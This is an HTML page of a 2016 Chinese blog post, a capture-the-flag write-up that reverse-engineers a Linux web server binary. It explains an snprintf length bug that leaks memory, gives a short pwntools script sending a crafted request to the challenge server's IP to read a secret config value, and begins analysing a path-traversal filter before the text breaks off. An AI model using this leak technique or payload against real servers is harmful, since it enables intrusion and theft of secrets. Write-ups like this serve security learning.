@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="default">
+<head>
+  <meta charset="utf-8">
+  
+  <title>寻找来自星星的你第二期Writeup | Hc1m1</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="三个白帽之寻找来自星星的你第二期WP，这期的题目我觉得应该放在Linux逆向分类中…">
+<meta property="og:type" content="article">
+<meta property="og:title" content="寻找来自星星的你第二期Writeup">
+<meta property="og:url" content="http://0x48.pw/2016/06/27/0x1D/index.html">
+<meta property="og:site_name" content="Hc1m1">
+<meta property="og:description" content="三个白帽之寻找来自星星的你第二期WP，这期的题目我觉得应该放在Linux逆向分类中…">
+<meta property="og:image" content="http://0x48.pw/img/baimao1.png">
+<meta property="og:updated_time" content="2016-06-27T06:35:38.867Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="寻找来自星星的你第二期Writeup">
+<meta name="twitter:description" content="三个白帽之寻找来自星星的你第二期WP，这期的题目我觉得应该放在Linux逆向分类中…">
+  
+    <link rel="alternative" href="/atom.xml" title="Hc1m1" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css" type="text/css">
+  
+  
+      <link href="//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css" rel="stylesheet">
+  
+  
+      <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+      <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+  
+  <link rel="stylesheet" href="/css/style.css" type="text/css">
+  
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css" type="text/css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
+  
+  <script src="//cdn.bootcss.com/jquery/1.9.1/jquery.min.js" type="text/javascript"></script>
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false,
+      }
+  </script>
+
+  
+      <script>
+          yiliaConfig.rootUrl = "/";
+      </script>
+  
+
+  
+      <script>
+          var _hmt = _hmt || [];
+          (function() {
+              var hm = document.createElement("script");
+              hm.src = "//hm.baidu.com/hm.js?4b6b8b9a09d24f4d4e26c50bd1707fd7";
+              var s = document.getElementsByTagName("script")[0]; 
+              s.parentNode.insertBefore(hm, s);
+          })();
+      </script>
+  
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="http://qn.lazysheep.cc/img/author.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Hcamael</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">Blog</p>
+        
+                
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/atom.xml" title="RSS"></a></li>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/CBC-Padding-Oracle-Attack/" style="font-size: 10px;">CBC Padding Oracle Attack</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 16.67px;">Crypto</a> <a href="/tags/GIT/" style="font-size: 10px;">GIT</a> <a href="/tags/Old博文/" style="font-size: 10px;">Old博文</a> <a href="/tags/PWN/" style="font-size: 10px;">PWN</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/Python/" style="font-size: 13.33px;">Python</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/Re/" style="font-size: 10px;">Re</a> <a href="/tags/SHA1-Length-Extension-Attack/" style="font-size: 10px;">SHA1 Length Extension Attack</a> <a href="/tags/SQLi/" style="font-size: 13.33px;">SQLi</a> <a href="/tags/Wechall/" style="font-size: 10px;">Wechall</a> <a href="/tags/密码学/" style="font-size: 10px;">密码学</a> <a href="/tags/检讨/" style="font-size: 10px;">检讨</a> <a href="/tags/网络/" style="font-size: 10px;">网络</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://hduisa.cn">HDUISA</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lightless.me">lightless</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://homeway.me">夏日小草</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.edwardl.xyz">Edward_L</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://evilddog.space">evilddog</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://aklis.info">Aklis</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://libc.pw">Explorer</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">脑子太蠢</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Hcamael</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="http://qn.lazysheep.cc/img/author.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Hcamael</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">Blog</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/atom.xml" title="RSS"></a></li>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-0x1D" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/06/27/0x1D/" class="article-date">
+      <time datetime="2016-06-27T12:11:37.000Z" itemprop="datePublished">2016-06-27</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      寻找来自星星的你第二期Writeup
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/H-blog/">H-blog</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Re/">Re</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>三个白帽之寻找来自星星的你第二期WP，这期的题目我觉得应该放在Linux逆向分类中…</p>
+<a id="more"></a>
+<p>本题的入口在<code>sub_401B08</code>函数，不过对解本题没啥帮助，所以可以跳到子进程的入口点<code>sub_4014D3</code>, 所以我们应该从该函数看起.</p>
+<figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="params">( !strncasecmp<span class="params">(::s1, <span class="string">"GET /server.bin"</span>, <span class="number">0</span>xFuLL)</span> )</span></span><br><span class="line">&#123;</span><br><span class="line">	file = <span class="string">"/server.bin"</span>;</span><br><span class="line">	v11 = <span class="params">(__int64)</span><span class="string">"image/bin"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第一个判断，也就是下载本题二进制文件，没啥好说的，主要是从后面开始有几个重要的判断，首先<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( strncasecmp(::s1, <span class="string">"GET"</span>, <span class="number">3u</span>LL) )</span><br><span class="line">	sub_40133B(<span class="number">2</span>, <span class="number">4202955L</span>L, <span class="number">4202720L</span>L, a1);</span><br><span class="line"><span class="comment">// 输入的前三个字符串要是GET，不区分大小写</span></span><br></pre></td></tr></table></figure></p>
+<p>PS: 这里注意下，<code>sub_40133B</code> 函数的第一个参数为<code>2</code>，则是执行报错退出.</p>
+<p>接下来<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qword_606248 = <span class="params">(__int64)</span>strstr<span class="params">(::s1, <span class="string">"HTTP/1.0"</span>)</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="params">( !qword_606248 )</span></span><br><span class="line">&#123;</span><br><span class="line">	qword_606248 = <span class="params">(__int64)</span>strstr<span class="params">(::s1, <span class="string">"HTTP/1.1"</span>)</span>;</span><br><span class="line">	<span class="keyword">if</span> <span class="params">( !qword_606248 )</span></span><br><span class="line">		sub_40133B<span class="params">(<span class="number">2</span>, <span class="number">4202929</span>LL, <span class="number">4202720</span>LL, a1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>然后传入的参数要存在<code>HTTP/1.0</code>或者<code>HTTP/1.1</code>字符串.</p>
+<p>接下来就是第一步的关键点了,<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">haystack = strstr<span class="params">(::s1, <span class="string">"Cookie: "</span>)</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="params">( !haystack )</span></span><br><span class="line">	sub_40133B<span class="params">(<span class="number">2</span>, <span class="number">4202908</span>LL, <span class="number">4202720</span>LL, a1)</span>;</span><br><span class="line">s = strstr<span class="params">(haystack, <span class="string">"auth="</span>)</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="params">( !s )</span></span><br><span class="line">	sub_40133B<span class="params">(<span class="number">2</span>, <span class="number">0</span>x4021E6LL, <span class="number">0</span>x4020E0LL, a1)</span>;</span><br><span class="line">sa = <span class="params">(__int64)</span><span class="params">(s + <span class="number">5</span>)</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="params">( strlen<span class="params">(<span class="params">(const char *)</span>sa)</span> &gt; <span class="number">0</span>x40 )</span></span><br><span class="line">	sub_40133B<span class="params">(<span class="number">2</span>, <span class="number">4203002</span>LL, <span class="number">4202720</span>LL, a1)</span>;</span><br><span class="line">sub_400F12<span class="params">(<span class="params">(__int64)</span>&amp;s1, sa)</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="params">( memcmp<span class="params">(&amp;s1, s2, <span class="number">0</span>x20uLL)</span> )</span></span><br><span class="line">	sub_40133B<span class="params">(<span class="number">2</span>, <span class="number">4203032</span>LL, <span class="number">4202720</span>LL, a1)</span>;</span><br></pre></td></tr></table></figure></p>
+<p>我们需传入Cookie参数，格式是<code>Cookie: auth=xxxxx</code>， xxxxx的长度不能大于0x40, 然后把sa传入<code>sub_400F12</code>函数， 进行一系列迷之处理后，赋值到s1，然后和s2比较前0x20个byte.</p>
+<p>s2是啥？s2是传入<code>sub_4014D3</code>的第三个参数，来溯源一下<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//<span class="keyword">sub_4014D3</span><br><span class="line"></span><span class="label">void</span> __fastcall __noreturn <span class="keyword">sub_4014D3(unsigned </span>int <span class="literal">a1</span>, unsigned int <span class="literal">a2</span>, const void *<span class="literal">a3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="label">...</span></span><br><span class="line"><span class="label">s2</span> = <span class="literal">a3</span><span class="comment">;</span></span><br><span class="line"><span class="label">...</span></span><br><span class="line">//<span class="keyword">sub_401B08</span><br><span class="line"></span><span class="label">...</span></span><br><span class="line"><span class="keyword">sub_401125("../server.cfg", </span>&amp;v11)<span class="comment">;</span></span><br><span class="line"><span class="label">...</span></span><br><span class="line"><span class="keyword">sub_4014D3(v9, </span>i, &amp;v11)<span class="comment">;</span></span><br><span class="line">//<span class="keyword">sub_401125</span><br><span class="line"></span><span class="label">int</span> __fastcall <span class="keyword">sub_401125(const </span>char *<span class="literal">a1</span>, char *<span class="literal">a2</span>)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *<span class="keyword">stream; </span>// [<span class="literal">sp</span>+<span class="number">20</span>h] [<span class="keyword">bp-10h]@1</span><br><span class="line"></span>  char *<span class="literal">v4</span><span class="comment">; // [sp+28h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">stream </span>= fopen(<span class="literal">a1</span>, <span class="string">"r"</span>)<span class="comment">;</span></span><br><span class="line">  fgets(<span class="literal">a2</span>, <span class="number">32</span>, <span class="keyword">stream);</span><br><span class="line"></span>  <span class="literal">v4</span> = <span class="keyword">strpbrk(a2, </span><span class="string">"\r\n"</span>)<span class="comment">;</span></span><br><span class="line">  <span class="preprocessor">if</span> ( <span class="literal">v4</span> )</span><br><span class="line">    *<span class="literal">v4</span> = <span class="number">0</span><span class="comment">;</span></span><br><span class="line">  return fclose(<span class="keyword">stream);</span><br><span class="line"></span>&#125;</span><br></pre></td></tr></table></figure></p>
+<p>s2为<code>../server.cfg</code>文件中的前32bytes字符串，属于未知，本题的第一步就是想办法得到s2的值或者绕过cookie认证.</p>
+<p>之后在报错退出的方法中看到一个函数<code>sub_401195</code><br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//<span class="keyword">sub_40133B</span><br><span class="line"></span><span class="label">else</span> <span class="preprocessor">if</span> ( <span class="literal">a1</span> == <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">sub_401195(v10, </span><span class="number">0x194</span>u, <span class="number">0x4020E0</span>LL)<span class="comment">;</span></span><br><span class="line">    sprintf(s, <span class="string">"&lt;HTML&gt;&lt;BODY&gt;&lt;H1&gt;WebServer: %s %s&lt;/H1&gt;&lt;/BODY&gt;&lt;/HTML&gt;"</span>, <span class="literal">a2</span>, v9)<span class="comment">;</span></span><br><span class="line">    <span class="literal">v6</span> = <span class="keyword">strlen(s);</span><br><span class="line"></span>    <span class="keyword">sub_4012E7(v10, </span>s, <span class="literal">v6</span>)<span class="comment">;</span></span><br><span class="line">    sprintf(s, <span class="string">"SORRY: %s-%s"</span>, <span class="literal">a2</span>, v9)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">//<span class="keyword">sub_401195</span><br><span class="line"></span><span class="label">v4</span> = snprintf(&amp;s, <span class="number">0x100</span>uLL, <span class="string">"%s %d %s\r\n"</span>, <span class="literal">v3</span>, <span class="literal">a2</span>, <span class="literal">a3</span>)<span class="comment">;</span></span><br><span class="line"><span class="label">result</span> = write(fd, &amp;s, <span class="literal">v4</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
+<p>通过google查找snprintf文档发现，该函数的功能我用python来表达下<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="label">tmp</span> = <span class="string">"%s %d %s\r\n"</span>%(<span class="literal">v3</span>, <span class="literal">a2</span>, <span class="literal">a3</span>)</span><br><span class="line">s = tmp[:<span class="number">0x100</span>]</span><br><span class="line"><span class="label">v4</span> = len(tmp)</span><br></pre></td></tr></table></figure></p>
+<p>问题就出在这了，v4的值为<code>len(tmp)</code>而不是<code>len(s)</code>.<br>这里的v3是可控的，所以我们可以通过控制v3来控制v4的值，然后通过<code>result = write(fd, &amp;s, v4);</code><br>泄露内存，做到这，第一步的思路已经很明了了，就是通过内存泄露来获取s2的值</p>
+<p>通过本地调试，发现<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffe453</span> <span class="number">2f</span>fb0 <span class="comment">//s的地址</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x7ffe453</span> <span class="number">30210</span> <span class="comment">//s2的地址</span></span><br></pre></td></tr></table></figure></p>
+<p>接下来就简单了，直接贴payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">r = remote(<span class="string">'123.59.56.23'</span>, <span class="number">43481</span>)</span><br><span class="line">payload = <span class="string">'GET /tmp/a\nHTTP/1.0'</span> + <span class="string">'g'</span>*(<span class="number">608</span>+<span class="number">3</span>) + <span class="string">'Cookie: auth=x\n'</span></span><br><span class="line">r.send(payload)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">	r.recv()</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/baimao1.png" alt="baimao"><br>得到<code>../server.cfg</code>中32bytes的内容.</p>
+<p>接下来就是分析<code>sub_400F12</code>函数，发现是一个base64decode函数，那就简单了，把这32bytes内容进行base64编码后加入cookie中. </p>
+<p>进入下一步，继续代码<br>代码贴出来分析<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line">	<span class="keyword">for</span> <span class="params">( i = <span class="number">0</span>LL; i &lt; <span class="params">(signed __int64)</span>n; ++i )</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> <span class="params">( *<span class="params">(_BYTE *)</span><span class="params">(i + <span class="number">0</span>x605240)</span> == <span class="number">0</span>xD || *<span class="params">(_BYTE *)</span><span class="params">(i + <span class="number">0</span>x605240)</span> == <span class="number">0</span>xA )</span></span><br><span class="line">		<span class="built_in">*</span><span class="params">(_BYTE *)</span><span class="params">(i + <span class="number">0</span>x605240)</span> = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// \n和\r都会转换成\0</span></span><br><span class="line">....</span><br><span class="line">	file = <span class="params">(char *)</span>&amp;unk_605244;</span><br><span class="line">	v8 = strlen<span class="params">(<span class="params">(const char *)</span>&amp;unk_605244)</span>;</span><br><span class="line">	v15 = <span class="number">0</span>LL;</span><br><span class="line">	while <span class="params">( v8 &gt; v15 &amp;&amp; isspace<span class="params">(file[v15])</span> )</span></span><br><span class="line">	&#123;</span><br><span class="line">		++v15;</span><br><span class="line">		++file;</span><br><span class="line">	&#125; <span class="comment">// 去除开头的空格</span></span><br><span class="line">	<span class="keyword">for</span> <span class="params">( j = <span class="number">0</span>LL; ; ++j )</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> <span class="params">( strlen<span class="params">(file)</span> &lt;= j )</span></span><br><span class="line">			goto LABEL_38;</span><br><span class="line">		<span class="keyword">if</span> <span class="params">( isspace<span class="params">(file[j])</span> )</span></span><br><span class="line">			break;</span><br><span class="line">	&#125;</span><br><span class="line">	file[j] = <span class="number">0</span>; <span class="comment">//把遇到的第一个空格转换成\0</span></span><br><span class="line">LABEL_38:</span><br><span class="line">	v9 = strlen<span class="params">(file)</span>;</span><br><span class="line">	<span class="keyword">for</span> <span class="params">( k = <span class="number">0</span>; k &lt; v9; ++k )</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> <span class="params">( file[k] == <span class="number">0</span>x2E &amp;&amp; file[k + <span class="number">1</span>] == <span class="number">0</span>x2E )</span></span><br><span class="line">			sub_40133B<span class="params">(<span class="number">2</span>, <span class="number">4203054</span>LL, <span class="params">(__int64)</span>file, a1)</span>; </span><br><span class="line">	&#125; <span class="comment">// file中不能存在连续的0x2E(.)字符</span></span><br><span class="line">	v11 = <span class="number">0</span>LL;</span><br><span class="line">	<span class="keyword">for</span> <span class="params">( l = <span class="number">0</span>LL; ; ++l )</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> <span class="params">( !off_603160[<span class="number">2</span> * l] )</span></span><br><span class="line">			goto LABEL_49;</span><br><span class="line">		v3 = <span class="params">(signed int)</span>strlen<span class="params">(off_603160[<span class="number">2</span> * l])</span>;</span><br><span class="line">		v4 = off_603160[<span class="number">2</span> <span class="built_in">*</span> l];</span><br><span class="line">		v5 = strlen<span class="params">(file)</span>;</span><br><span class="line">		<span class="keyword">if</span> <span class="params">( !strncmp<span class="params">(&amp;file[v5 - v3], v4, v3)</span> )</span></span><br><span class="line">			break;</span><br><span class="line">	&#125;</span><br><span class="line">	v11 = <span class="params">(__int64)</span>off_603160[<span class="number">2</span> <span class="built_in">*</span> l + <span class="number">1</span>]; <span class="comment">//后缀判断</span></span><br><span class="line">LABEL_49:</span><br><span class="line">	<span class="keyword">if</span> <span class="params">( !v11 )</span></span><br><span class="line">		sub_40133B<span class="params">(<span class="number">2</span>, <span class="number">4203080</span>LL, <span class="number">4202720</span>LL, a1)</span>;</span><br><span class="line">&#125;</span><br><span class="line">filea = <span class="params">(__int64)</span><span class="params">(file + <span class="number">1</span>)</span>;</span><br><span class="line">v10 = open<span class="params">(<span class="params">(const char *)</span>filea, <span class="number">0</span>, s2)</span>;</span><br></pre></td></tr></table></figure></p>
+<p>后缀判断:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0x401f20</span>:	<span class="string">"gif"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f24</span>:	<span class="string">"image/gif"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f2e</span>:	<span class="string">"jpg"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f32</span>:	<span class="string">"image/jpeg"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f3d</span>:	<span class="string">"png"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f41</span>:	<span class="string">"image/png"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f4b</span>:	<span class="string">"htm"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f4f</span>:	<span class="string">"text/html"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f59</span>:	<span class="string">"xml"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f5d</span>:	<span class="string">"text/xml"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f66</span>:	<span class="string">"tz"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f69</span>:	<span class="string">"image/gz"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f72</span>:	<span class="string">"js"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f75</span>:	<span class="string">"text/js"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f7d</span>:	<span class="string">"css"</span></span><br><span class="line"><span class="number">0</span><span class="attribute">x401f81</span>:	<span class="string">"text/css"</span></span><br><span class="line"><span class="comment">// 允许的后缀有8个: git, jpg, png, htm, xml, tz, js, css</span></span><br></pre></td></tr></table></figure></p>
+<p>根据上面的注释，我们一个一个的bypass限制，先来看看怎么bypass <code>..</code>的限制，<br>来看这句代码<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filea = <span class="list">(<span class="keyword">__int64</span>)</span><span class="list">(<span class="keyword">file</span> + <span class="number">1</span>)</span><span class="comment">;</span></span><br><span class="line">v10 = open<span class="list">(<span class="list">(<span class="keyword">const</span> char <span class="variable">*)filea, 0, s2);</span></span></span></span><br></pre></td></tr></table></figure></p>
